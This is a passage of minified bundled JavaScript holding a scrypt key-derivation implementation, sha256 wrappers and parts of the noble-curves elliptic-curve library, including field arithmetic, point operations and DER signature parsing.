    if (a < 0 || a > (2 ** 32 - 1) * 32)
        throw new Error("Scrypt: dkLen should be positive integer less than or equal to (2^32 - 1) * 32");
    const v = p * (i + s);
    if (v > f)
        throw new Error(`Scrypt: parameters too large, ${v} (128 * r * (N + p)) > ${f} (maxmem)`);
    const T = J3(eh, r, e, {
        c: 1,
        dkLen: p * s
    })
      , x = Bm(T)
      , E = Bm(new Uint8Array(p * i))
      , B = Bm(new Uint8Array(p));
    let P = () => {}
    ;
    if (h) {
        const O = 2 * i * s
          , F = Math.max(Math.floor(O / 1e4), 1);
        let D = 0;
        P = () => {
            D++,
            h && (!(D % F) || D === O) && h(D / O)
        }
    }
    return {
        N: i,
        r: n,
        p: s,
        dkLen: a,
        blockSize32: b,
        V: E,
        B32: x,
        B: T,
        tmp: B,
        blockMixCb: P,
        asyncTick: l
    }
}
function L7(r, e, t, o, i) {
    const n = J3(eh, r, t, {
        c: 1,
        dkLen: e
    });
    return t.fill(0),
    o.fill(0),
    i.fill(0),
    n
}
function Lfe(r, e, t) {
    const {N: o, r: i, p: n, dkLen: s, blockSize32: a, V: l, B32: f, B: h, tmp: p, blockMixCb: b} = k7(r, e, t);
    for (let v = 0; v < n; v++) {
        const T = a * v;
        for (let x = 0; x < a; x++)
            l[x] = f[T + x];
        for (let x = 0, E = 0; x < o - 1; x++)
            Yf(l, E, l, E += a, i),
            b();
        Yf(l, (o - 1) * a, f, T, i),
        b();
        for (let x = 0; x < o; x++) {
            const E = f[T + a - 16] % o;
            for (let B = 0; B < a; B++)
                p[B] = f[T + B] ^ l[E * a + B];
            Yf(p, 0, f, T, i),
            b()
        }
    }
    return L7(r, s, h, l, p)
}
async function $fe(r, e, t) {
    const {N: o, r: i, p: n, dkLen: s, blockSize32: a, V: l, B32: f, B: h, tmp: p, blockMixCb: b, asyncTick: v} = k7(r, e, t);
    for (let T = 0; T < n; T++) {
        const x = a * T;
        for (let B = 0; B < a; B++)
            l[B] = f[x + B];
        let E = 0;
        await lR(o - 1, v, () => {
            Yf(l, E, l, E += a, i),
            b()
        }
        ),
        Yf(l, (o - 1) * a, f, x, i),
        b(),
        await lR(o, v, () => {
            const B = f[x + a - 16] % o;
            for (let P = 0; P < a; P++)
                p[P] = f[x + P] ^ l[B * a + P];
            Yf(p, 0, f, x, i),
            b()
        }
        )
    }
    return L7(r, s, h, l, p)
}
let $7 = !1
  , z7 = !1;
const j7 = async function(r, e, t, o, i, n, s) {
    return await $fe(r, e, {
        N: t,
        r: o,
        p: i,
        dkLen: n,
        onProgress: s
    })
}
  , q7 = function(r, e, t, o, i, n) {
    return Lfe(r, e, {
        N: t,
        r: o,
        p: i,
        dkLen: n
    })
};
let V7 = j7
  , H7 = q7;
async function I0(r, e, t, o, i, n, s) {
    const a = pt(r, "passwd")
      , l = pt(e, "salt");
    return et(await V7(a, l, t, o, i, n, s))
}
I0._ = j7;
I0.lock = function() {
    z7 = !0
}
;
I0.register = function(r) {
    if (z7)
        throw new Error("scrypt is locked");
    V7 = r
}
;
Object.freeze(I0);
function O0(r, e, t, o, i, n) {
    const s = pt(r, "passwd")
      , a = pt(e, "salt");
    return et(H7(s, a, t, o, i, n))
}
O0._ = q7;
O0.lock = function() {
    $7 = !0
}
;
O0.register = function(r) {
    if ($7)
        throw new Error("scryptSync is locked");
    H7 = r
}
;
Object.freeze(O0);
const G7 = function(r) {
    return mfe("sha256").update(r).digest()
};
let K7 = G7
  , Z7 = !1;
function no(r) {
    const e = pt(r, "data");
    return et(K7(e))
}
no._ = G7;
no.lock = function() {
    Z7 = !0
}
;
no.register = function(r) {
    if (Z7)
        throw new Error("sha256 is locked");
    K7 = r
}
;
Object.freeze(no);
Object.freeze(no);
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const Y7 = BigInt(0)
  , Y1 = BigInt(1)
  , zfe = BigInt(2)
  , X1 = r => r instanceof Uint8Array
  , jfe = Array.from({
    length: 256
}, (r, e) => e.toString(16).padStart(2, "0"));
function Dd(r) {
    if (!X1(r))
        throw new Error("Uint8Array expected");
    let e = "";
    for (let t = 0; t < r.length; t++)
        e += jfe[r[t]];
    return e
}
function X7(r) {
    const e = r.toString(16);
    return e.length & 1 ? `0${e}` : e
}
function o4(r) {
    if (typeof r != "string")
        throw new Error("hex string expected, got " + typeof r);
    return BigInt(r === "" ? "0" : `0x${r}`)
}
function Fd(r) {
    if (typeof r != "string")
        throw new Error("hex string expected, got " + typeof r);
    const e = r.length;
    if (e % 2)
        throw new Error("padded hex string expected, got unpadded hex of length " + e);
    const t = new Uint8Array(e / 2);
    for (let o = 0; o < t.length; o++) {
        const i = o * 2
          , n = r.slice(i, i + 2)
          , s = Number.parseInt(n, 16);
        if (Number.isNaN(s) || s < 0)
            throw new Error("Invalid byte sequence");
        t[o] = s
    }
    return t
}
function nu(r) {
    return o4(Dd(r))
}
function i4(r) {
    if (!X1(r))
        throw new Error("Uint8Array expected");
    return o4(Dd(Uint8Array.from(r).reverse()))
}
function Ud(r, e) {
    return Fd(r.toString(16).padStart(e * 2, "0"))
}
function s4(r, e) {
    return Ud(r, e).reverse()
}
function qfe(r) {
    return Fd(X7(r))
}
function ts(r, e, t) {
    let o;
    if (typeof e == "string")
        try {
            o = Fd(e)
        } catch (n) {
            throw new Error(`${r} must be valid hex string, got "${e}". Cause: ${n}`)
        }
    else if (X1(e))
        o = Uint8Array.from(e);
    else
        throw new Error(`${r} must be hex string or Uint8Array`);
    const i = o.length;
    if (typeof t == "number" && i !== t)
        throw new Error(`${r} expected ${t} bytes, got ${i}`);
    return o
}
function Yp(...r) {
    const e = new Uint8Array(r.reduce( (o, i) => o + i.length, 0));
    let t = 0;
    return r.forEach(o => {
        if (!X1(o))
            throw new Error("Uint8Array expected");
        e.set(o, t),
        t += o.length
    }
    ),
    e
}
function Vfe(r, e) {
    if (r.length !== e.length)
        return !1;
    for (let t = 0; t < r.length; t++)
        if (r[t] !== e[t])
            return !1;
    return !0
}
function Hfe(r) {
    if (typeof r != "string")
        throw new Error(`utf8ToBytes expected string, got ${typeof r}`);
    return new Uint8Array(new TextEncoder().encode(r))
}
function Gfe(r) {
    let e;
    for (e = 0; r > Y7; r >>= Y1,
    e += 1)
        ;
    return e
}
function Kfe(r, e) {
    return r >> BigInt(e) & Y1
}
const Zfe = (r, e, t) => r | (t ? Y1 : Y7) << BigInt(e)
  , a4 = r => (zfe << BigInt(r - 1)) - Y1
  , M2 = r => new Uint8Array(r)
  , yR = r => Uint8Array.from(r);
function J7(r, e, t) {
    if (typeof r != "number" || r < 2)
        throw new Error("hashLen must be a number");
    if (typeof e != "number" || e < 2)
        throw new Error("qByteLen must be a number");
    if (typeof t != "function")
        throw new Error("hmacFn must be a function");
    let o = M2(r)
      , i = M2(r)
      , n = 0;
    const s = () => {
        o.fill(1),
        i.fill(0),
        n = 0
    }
      , a = (...p) => t(i, o, ...p)
      , l = (p=M2()) => {
        i = a(yR([0]), p),
        o = a(),
        p.length !== 0 && (i = a(yR([1]), p),
        o = a())
    }
      , f = () => {
        if (n++ >= 1e3)
            throw new Error("drbg: tried 1000 values");
        let p = 0;
        const b = [];
        for (; p < e; ) {
            o = a();
            const v = o.slice();
            b.push(v),
            p += o.length
        }
        return Yp(...b)
    }
    ;
    return (p, b) => {
        s(),
        l(p);
        let v;
        for (; !(v = b(f())); )
            l();
        return s(),
        v
    }
}
const Yfe = {
    bigint: r => typeof r == "bigint",
    function: r => typeof r == "function",
    boolean: r => typeof r == "boolean",
    string: r => typeof r == "string",
    stringOrUint8Array: r => typeof r == "string" || r instanceof Uint8Array,
    isSafeInteger: r => Number.isSafeInteger(r),
    array: r => Array.isArray(r),
    field: (r, e) => e.Fp.isValid(r),
    hash: r => typeof r == "function" && Number.isSafeInteger(r.outputLen)
};
function R0(r, e, t={}) {
    const o = (i, n, s) => {
        const a = Yfe[n];
        if (typeof a != "function")
            throw new Error(`Invalid validator "${n}", expected function`);
        const l = r[i];
        if (!(s && l === void 0) && !a(l, r))
            throw new Error(`Invalid param ${String(i)}=${l} (${typeof l}), expected ${n}`)
    }
    ;
    for (const [i,n] of Object.entries(e))
        o(i, n, !1);
    for (const [i,n] of Object.entries(t))
        o(i, n, !0);
    return r
}
const Xfe = Object.freeze(Object.defineProperty({
    __proto__: null,
    bitGet: Kfe,
    bitLen: Gfe,
    bitMask: a4,
    bitSet: Zfe,
    bytesToHex: Dd,
    bytesToNumberBE: nu,
    bytesToNumberLE: i4,
    concatBytes: Yp,
    createHmacDrbg: J7,
    ensureBytes: ts,
    equalBytes: Vfe,
    hexToBytes: Fd,
    hexToNumber: o4,
    numberToBytesBE: Ud,
    numberToBytesLE: s4,
    numberToHexUnpadded: X7,
    numberToVarBytesBE: qfe,
    utf8ToBytes: Hfe,
    validateObject: R0
}, Symbol.toStringTag, {
    value: "Module"
}));
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const On = BigInt(0)
  , en = BigInt(1)
  , Fl = BigInt(2)
  , Jfe = BigInt(3)
  , bA = BigInt(4)
  , bR = BigInt(5)
  , mR = BigInt(8);
BigInt(9);
BigInt(16);
function Wo(r, e) {
    const t = r % e;
    return t >= On ? t : e + t
}
function Qfe(r, e, t) {
    if (t <= On || e < On)
        throw new Error("Expected power/modulo > 0");
    if (t === en)
        return On;
    let o = en;
    for (; e > On; )
        e & en && (o = o * r % t),
        r = r * r % t,
        e >>= en;
    return o
}
function Ei(r, e, t) {
    let o = r;
    for (; e-- > On; )
        o *= o,
        o %= t;
    return o
}
function mA(r, e) {
    if (r === On || e <= On)
        throw new Error(`invert: expected positive integers, got n=${r} mod=${e}`);
    let t = Wo(r, e)
      , o = e
      , i = On
      , n = en;
    for (; t !== On; ) {
        const a = o / t
          , l = o % t
          , f = i - n * a;
        o = t,
        t = l,
        i = n,
        n = f
    }
    if (o !== en)
        throw new Error("invert: does not exist");
    return Wo(i, e)
}
function ede(r) {
    const e = (r - en) / Fl;
    let t, o, i;
    for (t = r - en,
    o = 0; t % Fl === On; t /= Fl,
    o++)
        ;
    for (i = Fl; i < r && Qfe(i, e, r) !== r - en; i++)
        ;
    if (o === 1) {
        const s = (r + en) / bA;
        return function(l, f) {
            const h = l.pow(f, s);
            if (!l.eql(l.sqr(h), f))
                throw new Error("Cannot find square root");
            return h
        }
    }
    const n = (t + en) / Fl;
    return function(a, l) {
        if (a.pow(l, e) === a.neg(a.ONE))
            throw new Error("Cannot find square root");
        let f = o
          , h = a.pow(a.mul(a.ONE, i), t)
          , p = a.pow(l, n)
          , b = a.pow(l, t);
        for (; !a.eql(b, a.ONE); ) {
            if (a.eql(b, a.ZERO))
                return a.ZERO;
            let v = 1;
            for (let x = a.sqr(b); v < f && !a.eql(x, a.ONE); v++)
                x = a.sqr(x);
            const T = a.pow(h, en << BigInt(f - v - 1));
            h = a.sqr(T),
            p = a.mul(p, T),
            b = a.mul(b, h),
            f = v
        }
        return p
    }
}
function tde(r) {
    if (r % bA === Jfe) {
        const e = (r + en) / bA;
        return function(o, i) {
            const n = o.pow(i, e);
            if (!o.eql(o.sqr(n), i))
                throw new Error("Cannot find square root");
            return n
        }
    }
    if (r % mR === bR) {
        const e = (r - bR) / mR;
        return function(o, i) {
            const n = o.mul(i, Fl)
              , s = o.pow(n, e)
              , a = o.mul(i, s)
              , l = o.mul(o.mul(a, Fl), s)
              , f = o.mul(a, o.sub(l, o.ONE));
            if (!o.eql(o.sqr(f), i))
                throw new Error("Cannot find square root");
            return f
        }
    }
    return ede(r)
}
const rde = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
function nde(r) {
    const e = {
        ORDER: "bigint",
        MASK: "bigint",
        BYTES: "isSafeInteger",
        BITS: "isSafeInteger"
    }
      , t = rde.reduce( (o, i) => (o[i] = "function",
    o), e);
    return R0(r, t)
}
function ode(r, e, t) {
    if (t < On)
        throw new Error("Expected power > 0");
    if (t === On)
        return r.ONE;
    if (t === en)
        return e;
    let o = r.ONE
      , i = e;
    for (; t > On; )
        t & en && (o = r.mul(o, i)),
        i = r.sqr(i),
        t >>= en;
    return o
}
function ide(r, e) {
    const t = new Array(e.length)
      , o = e.reduce( (n, s, a) => r.is0(s) ? n : (t[a] = n,
    r.mul(n, s)), r.ONE)
      , i = r.inv(o);
    return e.reduceRight( (n, s, a) => r.is0(s) ? n : (t[a] = r.mul(n, t[a]),
    r.mul(n, s)), i),
    t
}
function Q7(r, e) {
    const t = e !== void 0 ? e : r.toString(2).length
      , o = Math.ceil(t / 8);
    return {
        nBitLength: t,
        nByteLength: o
    }
}
function sde(r, e, t=!1, o={}) {
    if (r <= On)
        throw new Error(`Expected Field ORDER > 0, got ${r}`);
    const {nBitLength: i, nByteLength: n} = Q7(r, e);
    if (n > 2048)
        throw new Error("Field lengths over 2048 bytes are not supported");
    const s = tde(r)
      , a = Object.freeze({
        ORDER: r,
        BITS: i,
        BYTES: n,
        MASK: a4(i),
        ZERO: On,
        ONE: en,
        create: l => Wo(l, r),
        isValid: l => {
            if (typeof l != "bigint")
                throw new Error(`Invalid field element: expected bigint, got ${typeof l}`);
            return On <= l && l < r
        }
        ,
        is0: l => l === On,
        isOdd: l => (l & en) === en,
        neg: l => Wo(-l, r),
        eql: (l, f) => l === f,
        sqr: l => Wo(l * l, r),
        add: (l, f) => Wo(l + f, r),
        sub: (l, f) => Wo(l - f, r),
        mul: (l, f) => Wo(l * f, r),
        pow: (l, f) => ode(a, l, f),
        div: (l, f) => Wo(l * mA(f, r), r),
        sqrN: l => l * l,
        addN: (l, f) => l + f,
        subN: (l, f) => l - f,
        mulN: (l, f) => l * f,
        inv: l => mA(l, r),
        sqrt: o.sqrt || (l => s(a, l)),
        invertBatch: l => ide(a, l),
        cmov: (l, f, h) => h ? f : l,
        toBytes: l => t ? s4(l, n) : Ud(l, n),
        fromBytes: l => {
            if (l.length !== n)
                throw new Error(`Fp.fromBytes: expected ${n}, got ${l.length}`);
            return t ? i4(l) : nu(l)
        }
    });
    return Object.freeze(a)
}
function eF(r) {
    if (typeof r != "bigint")
        throw new Error("field order must be bigint");
    const e = r.toString(2).length;
    return Math.ceil(e / 8)
}
function tF(r) {
    const e = eF(r);
    return e + Math.ceil(e / 2)
}
function ade(r, e, t=!1) {
    const o = r.length
      , i = eF(e)
      , n = tF(e);
    if (o < 16 || o < n || o > 1024)
        throw new Error(`expected ${n}-1024 bytes of input, got ${o}`);
    const s = t ? nu(r) : i4(r)
      , a = Wo(s, e - en) + en;
    return t ? s4(a, i) : Ud(a, i)
}
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const cde = BigInt(0)
  , N2 = BigInt(1);
function lde(r, e) {
    const t = (i, n) => {
        const s = n.negate();
        return i ? s : n
    }
      , o = i => {
        const n = Math.ceil(e / i) + 1
          , s = 2 ** (i - 1);
        return {
            windows: n,
            windowSize: s
        }
    }
    ;
    return {
        constTimeNegate: t,
        unsafeLadder(i, n) {
            let s = r.ZERO
              , a = i;
            for (; n > cde; )
                n & N2 && (s = s.add(a)),
                a = a.double(),
                n >>= N2;
            return s
        },
        precomputeWindow(i, n) {
            const {windows: s, windowSize: a} = o(n)
              , l = [];
            let f = i
              , h = f;
            for (let p = 0; p < s; p++) {
                h = f,
                l.push(h);
                for (let b = 1; b < a; b++)
                    h = h.add(f),
                    l.push(h);
                f = h.double()
            }
            return l
        },
        wNAF(i, n, s) {
            const {windows: a, windowSize: l} = o(i);
            let f = r.ZERO
              , h = r.BASE;
            const p = BigInt(2 ** i - 1)
              , b = 2 ** i
              , v = BigInt(i);
            for (let T = 0; T < a; T++) {
                const x = T * l;
                let E = Number(s & p);
                s >>= v,
                E > l && (E -= b,
                s += N2);
                const B = x
                  , P = x + Math.abs(E) - 1
                  , O = T % 2 !== 0
                  , F = E < 0;
                E === 0 ? h = h.add(t(O, n[B])) : f = f.add(t(F, n[P]))
            }
            return {
                p: f,
                f: h
            }
        },
        wNAFCached(i, n, s, a) {
            const l = i._WINDOW_SIZE || 1;
            let f = n.get(i);
            return f || (f = this.precomputeWindow(i, l),
            l !== 1 && n.set(i, a(f))),
            this.wNAF(l, f, s)
        }
    }
}
function rF(r) {
    return nde(r.Fp),
    R0(r, {
        n: "bigint",
        h: "bigint",
        Gx: "field",
        Gy: "field"
    }, {
        nBitLength: "isSafeInteger",
        nByteLength: "isSafeInteger"
    }),
    Object.freeze({
        ...Q7(r.n, r.nBitLength),
        ...r,
        p: r.Fp.ORDER
    })
}
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
function ude(r) {
    const e = rF(r);
    R0(e, {
        a: "field",
        b: "field"
    }, {
        allowedPrivateKeyLengths: "array",
        wrapPrivateKey: "boolean",
        isTorsionFree: "function",
        clearCofactor: "function",
        allowInfinityPoint: "boolean",
        fromBytes: "function",
        toBytes: "function"
    });
    const {endo: t, Fp: o, a: i} = e;
    if (t) {
        if (!o.eql(i, o.ZERO))
            throw new Error("Endomorphism can only be defined for Koblitz curves that have a=0");
        if (typeof t != "object" || typeof t.beta != "bigint" || typeof t.splitScalar != "function")
            throw new Error("Expected endomorphism with beta: bigint and splitScalar: function")
    }
    return Object.freeze({
        ...e
    })
}
const {bytesToNumberBE: fde, hexToBytes: dde} = Xfe
  , ql = {
    Err: class extends Error {
        constructor(e="") {
            super(e)
        }
    }
    ,
    _parseInt(r) {
        const {Err: e} = ql;
        if (r.length < 2 || r[0] !== 2)
            throw new e("Invalid signature integer tag");
        const t = r[1]
          , o = r.subarray(2, t + 2);
        if (!t || o.length !== t)
            throw new e("Invalid signature integer: wrong length");
        if (o[0] & 128)
            throw new e("Invalid signature integer: negative");
        if (o[0] === 0 && !(o[1] & 128))
            throw new e("Invalid signature integer: unnecessary leading zero");
        return {
            d: fde(o),
            l: r.subarray(t + 2)
        }
    },
    toSig(r) {
        const {Err: e} = ql
          , t = typeof r == "string" ? dde(r) : r;
        if (!(t instanceof Uint8Array))
            throw new Error("ui8a expected");
        let o = t.length;
        if (o < 2 || t[0] != 48)
            throw new e("Invalid signature tag");
        if (t[1] !== o - 2)
            throw new e("Invalid signature: incorrect length");
        const {d: i, l: n} = ql._parseInt(t.subarray(2))
          , {d: s, l: a} = ql._parseInt(n);
        if (a.length)
            throw new e("Invalid signature: left bytes after parsing");
        return {
            r: i,
            s
        }
    },
    hexFromSig(r) {
        const e = f => Number.parseInt(f[0], 16) & 8 ? "00" + f : f
          , t = f => {
            const h = f.toString(16);
            return h.length & 1 ? `0${h}` : h
        }
          , o = e(t(r.s))
          , i = e(t(r.r))
          , n = o.length / 2
          , s = i.length / 2
          , a = t(n)
          , l = t(s);
        return `30${t(s + n + 4)}02${l}${i}02${a}${o}`
    }
}
  , Ua = BigInt(0)
  , Di = BigInt(1);
BigInt(2);
const xR = BigInt(3);
BigInt(4);
function hde(r) {
    const e = ude(r)
      , {Fp: t} = e
      , o = e.toBytes || ( (T, x, E) => {
        const B = x.toAffine();
        return Yp(Uint8Array.from([4]), t.toBytes(B.x), t.toBytes(B.y))
    }
    )
      , i = e.fromBytes || (T => {
        const x = T.subarray(1)
          , E = t.fromBytes(x.subarray(0, t.BYTES))
          , B = t.fromBytes(x.subarray(t.BYTES, 2 * t.BYTES));
        return {
            x: E,
            y: B
        }
    }
    );
    function n(T) {
        const {a: x, b: E} = e
          , B = t.sqr(T)
          , P = t.mul(B, T);
        return t.add(t.add(P, t.mul(T, x)), E)
    }
    if (!t.eql(t.sqr(e.Gy), n(e.Gx)))
        throw new Error("bad generator point: equation left != right");
    function s(T) {
        return typeof T == "bigint" && Ua < T && T < e.n
    }
    function a(T) {
        if (!s(T))
            throw new Error("Expected valid bigint: 0 < bigint < curve.n")
    }
    function l(T) {
        const {allowedPrivateKeyLengths: x, nByteLength: E, wrapPrivateKey: B, n: P} = e;
        if (x && typeof T != "bigint") {
            if (T instanceof Uint8Array && (T = Dd(T)),
            typeof T != "string" || !x.includes(T.length))
                throw new Error("Invalid key");
            T = T.padStart(E * 2, "0")
        }
        let O;
        try {
            O = typeof T == "bigint" ? T : nu(ts("private key", T, E))
        } catch {
            throw new Error(`private key must be ${E} bytes, hex or bigint, not ${typeof T}`)
        }
        return B && (O = Wo(O, P)),
        a(O),
        O
    }
    const f = new Map;
    function h(T) {
        if (!(T instanceof p))
            throw new Error("ProjectivePoint expected")
    }
    class p {
        constructor(x, E, B) {
            if (this.px = x,
            this.py = E,
            this.pz = B,
            x == null || !t.isValid(x))
                throw new Error("x required");
            if (E == null || !t.isValid(E))
                throw new Error("y required");
            if (B == null || !t.isValid(B))
                throw new Error("z required")
        }
        static fromAffine(x) {
            const {x: E, y: B} = x || {};
            if (!x || !t.isValid(E) || !t.isValid(B))
                throw new Error("invalid affine point");
            if (x instanceof p)
                throw new Error("projective point not allowed");
            const P = O => t.eql(O, t.ZERO);
            return P(E) && P(B) ? p.ZERO : new p(E,B,t.ONE)
        }
        get x() {
            return this.toAffine().x
        }
        get y() {
            return this.toAffine().y
        }
        static normalizeZ(x) {
            const E = t.invertBatch(x.map(B => B.pz));
            return x.map( (B, P) => B.toAffine(E[P])).map(p.fromAffine)
        }
        static fromHex(x) {
            const E = p.fromAffine(i(ts("pointHex", x)));
            return E.assertValidity(),
            E
        }
        static fromPrivateKey(x) {
            return p.BASE.multiply(l(x))
        }
        _setWindowSize(x) {
            this._WINDOW_SIZE = x,
            f.delete(this)
        }
        assertValidity() {
            if (this.is0()) {
                if (e.allowInfinityPoint && !t.is0(this.py))
                    return;
                throw new Error("bad point: ZERO")
            }
            const {x, y: E} = this.toAffine();
            if (!t.isValid(x) || !t.isValid(E))
                throw new Error("bad point: x or y not FE");
            const B = t.sqr(E)
              , P = n(x);
            if (!t.eql(B, P))
                throw new Error("bad point: equation left != right");
            if (!this.isTorsionFree())
                throw new Error("bad point: not in prime-order subgroup")
        }
        hasEvenY() {
            const {y: x} = this.toAffine();
            if (t.isOdd)
                return !t.isOdd(x);
            throw new Error("Field doesn't support isOdd")
        }
        equals(x) {
            h(x);
            const {px: E, py: B, pz: P} = this
              , {px: O, py: F, pz: D} = x
              , I = t.eql(t.mul(E, D), t.mul(O, P))
              , M = t.eql(t.mul(B, D), t.mul(F, P));
            return I && M
        }
        negate() {
            return new p(this.px,t.neg(this.py),this.pz)
        }
        double() {
            const {a: x, b: E} = e
              , B = t.mul(E, xR)
              , {px: P, py: O, pz: F} = this;
            let D = t.ZERO
              , I = t.ZERO
              , M = t.ZERO
              , C = t.mul(P, P)
              , W = t.mul(O, O)
              , k = t.mul(F, F)
              , H = t.mul(P, O);
            return H = t.add(H, H),
            M = t.mul(P, F),
            M = t.add(M, M),
            D = t.mul(x, M),
            I = t.mul(B, k),
            I = t.add(D, I),
            D = t.sub(W, I),
            I = t.add(W, I),
            I = t.mul(D, I),
            D = t.mul(H, D),
            M = t.mul(B, M),
            k = t.mul(x, k),
            H = t.sub(C, k),
            H = t.mul(x, H),
            H = t.add(H, M),
            M = t.add(C, C),
            C = t.add(M, C),
            C = t.add(C, k),
            C = t.mul(C, H),
            I = t.add(I, C),
            k = t.mul(O, F),
            k = t.add(k, k),
            C = t.mul(k, H),
            D = t.sub(D, C),
            M = t.mul(k, W),
            M = t.add(M, M),
            M = t.add(M, M),
            new p(D,I,M)
        }
        add(x) {
            h(x);
            const {px: E, py: B, pz: P} = this
              , {px: O, py: F, pz: D} = x;
            let I = t.ZERO
              , M = t.ZERO
              , C = t.ZERO;
            const W = e.a
              , k = t.mul(e.b, xR);
            let H = t.mul(E, O)
              , X = t.mul(B, F)
              , Y = t.mul(P, D)
              , V = t.add(E, B)
              , R = t.add(O, F);
            V = t.mul(V, R),
            R = t.add(H, X),
            V = t.sub(V, R),
            R = t.add(E, P);
            let _ = t.add(O, D);
            return R = t.mul(R, _),
            _ = t.add(H, Y),
            R = t.sub(R, _),
            _ = t.add(B, P),
            I = t.add(F, D),
            _ = t.mul(_, I),
            I = t.add(X, Y),
            _ = t.sub(_, I),
            C = t.mul(W, R),
            I = t.mul(k, Y),
            C = t.add(I, C),
            I = t.sub(X, C),
            C = t.add(X, C),
            M = t.mul(I, C),
            X = t.add(H, H),
            X = t.add(X, H),
            Y = t.mul(W, Y),
            R = t.mul(k, R),
            X = t.add(X, Y),
            Y = t.sub(H, Y),
            Y = t.mul(W, Y),
            R = t.add(R, Y),
            H = t.mul(X, R),
            M = t.add(M, H),
            H = t.mul(_, R),
            I = t.mul(V, I),
            I = t.sub(I, H),
            H = t.mul(V, X),
            C = t.mul(_, C),
            C = t.add(C, H),
            new p(I,M,C)
        }
        subtract(x) {
            return this.add(x.negate())
        }
        is0() {
            return this.equals(p.ZERO)
        }
        wNAF(x) {
            return v.wNAFCached(this, f, x, E => {
                const B = t.invertBatch(E.map(P => P.pz));
                return E.map( (P, O) => P.toAffine(B[O])).map(p.fromAffine)
            }
            )
        }
        multiplyUnsafe(x) {
            const E = p.ZERO;
            if (x === Ua)
                return E;
            if (a(x),
            x === Di)
                return this;
            const {endo: B} = e;
            if (!B)
                return v.unsafeLadder(this, x);
            let {k1neg: P, k1: O, k2neg: F, k2: D} = B.splitScalar(x)
              , I = E
              , M = E
              , C = this;
            for (; O > Ua || D > Ua; )
                O & Di && (I = I.add(C)),
                D & Di && (M = M.add(C)),
                C = C.double(),
                O >>= Di,
                D >>= Di;
            return P && (I = I.negate()),
            F && (M = M.negate()),
            M = new p(t.mul(M.px, B.beta),M.py,M.pz),
            I.add(M)
        }
        multiply(x) {
            a(x);
            let E = x, B, P;
            const {endo: O} = e;
            if (O) {
                const {k1neg: F, k1: D, k2neg: I, k2: M} = O.splitScalar(E);
                let {p: C, f: W} = this.wNAF(D)
                  , {p: k, f: H} = this.wNAF(M);
                C = v.constTimeNegate(F, C),
                k = v.constTimeNegate(I, k),
                k = new p(t.mul(k.px, O.beta),k.py,k.pz),
                B = C.add(k),
                P = W.add(H)
            } else {
                const {p: F, f: D} = this.wNAF(E);
                B = F,
                P = D
            }
            return p.normalizeZ([B, P])[0]
        }
        multiplyAndAddUnsafe(x, E, B) {
            const P = p.BASE
              , O = (D, I) => I === Ua || I === Di || !D.equals(P) ? D.multiplyUnsafe(I) : D.multiply(I)
              , F = O(this, E).add(O(x, B));
            return F.is0() ? void 0 : F
        }
        toAffine(x) {
            const {px: E, py: B, pz: P} = this
              , O = this.is0();
            x == null && (x = O ? t.ONE : t.inv(P));
            const F = t.mul(E, x)
              , D = t.mul(B, x)
              , I = t.mul(P, x);
            if (O)
                return {
                    x: t.ZERO,
                    y: t.ZERO
                };
            if (!t.eql(I, t.ONE))
                throw new Error("invZ was invalid");
            return {
                x: F,
                y: D
            }
        }
        isTorsionFree() {
            const {h: x, isTorsionFree: E} = e;
            if (x === Di)
                return !0;
            if (E)
                return E(p, this);
            throw new Error("isTorsionFree() has not been declared for the elliptic curve")
        }
        clearCofactor() {
            const {h: x, clearCofactor: E} = e;
            return x === Di ? this : E ? E(p, this) : this.multiplyUnsafe(e.h)
        }
        toRawBytes(x=!0) {
            return this.assertValidity(),
            o(p, this, x)
        }
        toHex(x=!0) {
            return Dd(this.toRawBytes(x))
        }
    }
    p.BASE = new p(e.Gx,e.Gy,t.ONE),
    p.ZERO = new p(t.ZERO,t.ONE,t.ZERO);
    const b = e.nBitLength
      , v = lde(p, e.endo ? Math.ceil(b / 2) : b);
    return {
        CURVE: e,
        ProjectivePoint: p,
        normPrivateKeyToScalar: l,
        weierstrassEquation: n,
        isWithinCurveOrder: s
    }
}
function pde(r) {
    const e = rF(r);
    return R0(e, {
        hash: "hash",
        hmac: "function",
        randomBytes: "function"
    }, {
        bits2int: "function",
        bits2int_modN: "function",
        lowS: "boolean"
    }),
    Object.freeze({
        lowS: !0,
        ...e
    })
}
function gde(r) {
    const e = pde(r)
      , {Fp: t, n: o} = e
      , i = t.BYTES + 1
      , n = 2 * t.BYTES + 1;
    function s(R) {
        return Ua < R && R < t.ORDER
    }
    function a(R) {
        return Wo(R, o)
    }
    function l(R) {
        return mA(R, o)
    }
    const {ProjectivePoint: f, normPrivateKeyToScalar: h, weierstrassEquation: p, isWithinCurveOrder: b} = hde({
        ...e,
        toBytes(R, _, $) {
            const z = _.toAffine()
              , K = t.toBytes(z.x)
              , j = Yp;
            return $ ? j(Uint8Array.from([_.hasEvenY() ? 2 : 3]), K) : j(Uint8Array.from([4]), K, t.toBytes(z.y))
        },
        fromBytes(R) {
            const _ = R.length
              , $ = R[0]
              , z = R.subarray(1);
            if (_ === i && ($ === 2 || $ === 3)) {
                const K = nu(z);
                if (!s(K))
                    throw new Error("Point is not on curve");
                const j = p(K);
                let ee = t.sqrt(j);
                const ie = (ee & Di) === Di;
                return ($ & 1) === 1 !== ie && (ee = t.neg(ee)),
                {
                    x: K,
                    y: ee
                }
            } else if (_ === n && $ === 4) {
                const K = t.fromBytes(z.subarray(0, t.BYTES))
                  , j = t.fromBytes(z.subarray(t.BYTES, 2 * t.BYTES));
                return {
                    x: K,
                    y: j
                }
            } else
                throw new Error(`Point of length ${_} was invalid. Expected ${i} compressed bytes or ${n} uncompressed bytes`)
        }
    })
      , v = R => Dd(Ud(R, e.nByteLength));
    function T(R) {
        const _ = o >> Di;
        return R > _
    }
    function x(R) {
        return T(R) ? a(-R) : R
    }
    const E = (R, _, $) => nu(R.slice(_, $));
    class B {
        constructor(_, $, z) {
            this.r = _,
            this.s = $,
            this.recovery = z,
            this.assertValidity()
        }
        static fromCompact(_) {
            const $ = e.nByteLength;
            return _ = ts("compactSignature", _, $ * 2),
            new B(E(_, 0, $),E(_, $, 2 * $))
        }
        static fromDER(_) {
            const {r: $, s: z} = ql.toSig(ts("DER", _));
            return new B($,z)
